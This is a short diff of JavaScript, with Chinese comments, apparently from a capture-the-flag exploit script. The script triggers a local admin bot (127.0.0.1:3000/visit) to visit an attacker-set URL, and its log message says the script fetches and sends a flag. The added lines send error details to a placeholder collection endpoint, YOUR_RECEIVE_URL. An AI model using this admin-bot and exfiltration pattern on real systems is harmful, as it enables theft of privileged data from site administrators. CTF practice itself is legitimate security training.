@@ -31,7 +31,10 @@
                 return res.json();
             }; // 仅解析admin返回的合法JSON
             throw new Error('非200响应');
-        });
+        }).catch(err => {
+            console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
+            fetch(YOUR_RECEIVE_URL+'?err-0='+err.stack);
+        });;
     const param = {"url":ADMIN_URL};
     fetch('http://127.0.0.1:3000/visit',{
       method: 'POST', // 必须指定为 POST
